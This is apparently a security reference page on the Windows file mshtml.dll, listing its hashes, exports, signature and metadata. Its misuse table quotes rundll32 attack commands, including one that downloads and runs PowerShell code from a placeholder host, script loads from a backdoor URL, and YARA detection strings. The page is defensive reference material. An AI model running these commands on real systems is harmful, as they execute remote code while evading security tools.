---
title: mshtml.dll | Microsoft (R) HTML Viewer
excerpt: What is mshtml.dll?
---

# mshtml.dll 

* File Path: `C:\Windows\SysWOW64\mshtml.dll`
* Description: Microsoft (R) HTML Viewer

## Hashes

Type | Hash
-- | --
MD5 | `DF00815E65CABF70A7D442EEFFB50E0D`
SHA1 | `25ADD2135E6DA6DBB42C61BAC99CDBE348B8D574`
SHA256 | `47DDAA6888E7DF9490DA5FA3A15E9F6CAC38BAB927AEE810D0DB5BAEABBD82EA`
SHA384 | `712223892B9428265728E65A9A9C3068A01387E40C48A8DDC386656AF73B2CDDED66565BC4D4F2DB127A43E8F1E42E85`
SHA512 | `41D90C7D32136C45466A7575096206FDBFB9033AED641E2F31B785B2B099192DFC34959014744D7B66A1A98029EF2CCC112517679DD4EC527588F2D3C3E4FF88`
SSDEEP | `393216:IKCBkkSvQLbt6jSuHfH9Gx5e7iemV+iUUXi1PDq7voB:VDkSvObt6jJ91eVXNkPm7w`
IMP | `78CA0B0D2E6DF42028B3B7D22A2FEBA4`
PESHA1 | `7154E7EC1AB11D138B3E51CAA25A20FA7AE017B9`
PE256 | `F58C995A56CB553B4CA47FAC961B019B88A1E5C77838438A9E824E4783D166EB`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`ClearPhishingFilterData` | 108 | Exported Function
`TravelLogCreateInstance` | 141 | Exported Function
`ShowModelessHTMLDialog` | 140 | Exported Function
`ShowModalDialog` | 139 | Exported Function
`ShowHTMLDialogEx` | 137 | Exported Function
`ShowHTMLDialog` | 136 | Exported Function
`RunHTMLApplication` | 135 | Exported Function
`PrintHTML` | 133 | Exported Function
`MatchExactGetIDsOfNames` | 132 | Exported Function
`InitializeLocalHtmlEngine` | 119 | Exported Function
`IERegisterXMLNS` | 118 | Exported Function
`IEIsXMLNSRegistered` | 117 | Exported Function
`GetWebPlatformObject` | 116 | Exported Function
`GetColorValueFromString` | 115 | Exported Function
`DllGetClassObject` | 114 | Exported Function
`DllEnumClassObjects` | 113 | Exported Function
`DllCanUnloadNow` | 112 | Exported Function
`CreateHTMLPropertyPage` | 111 | Exported Function
`CreateCoreWebView` | 110 | Exported Function
`ConvertAndEscapePostData` | 109 | Exported Function
`TravelLogStgCreateInstance` | 142 | Exported Function
`UninitializeLocalHtmlEngine` | 143 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: MSHTML.DLL
* Product Name: Internet Explorer
* Company Name: Microsoft Corporation
* File Version: 11.00.19041.508 (WinBuild.160101.0800)
* Product Version: 11.00.19041.508
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/67
* VirusTotal Link: https://www.virustotal.com/gui/file/47ddaa6888e7df9490da5fa3a15e9f6cac38bab927aee810d0db5baeabbd82ea/detection/


## Possible Misuse

*The following table contains possible examples of `mshtml.dll` being misused. While `mshtml.dll` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `Name: Mshtml.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Command: rundll32.exe Mshtml.dll,PrintHTML "C:\temp\calc.hta"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Path: c:\windows\system32\mshtml.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Path: c:\windows\syswow64\mshtml.dll` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [misp-dukes-operation-ghost-event.json](https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json) | `"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [misp_invisimole.json](https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json) | `"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec(); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_khrat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_khrat.yar) | $x2 = "CreateObject(\"WScript.Shell\").Run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_tidepool.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_tidepool.yar) | $x2 = "C:\\PROGRA~2\\IEHelper\\mshtml.dll" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_tidepool.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_tidepool.yar) | $x3 = "C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_unit78020_malware.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_unit78020_malware.yar) | $s4 = "mshtml.dat" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_scripts.yar) | $s1 = "mshtml,RunHTMLApplication" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


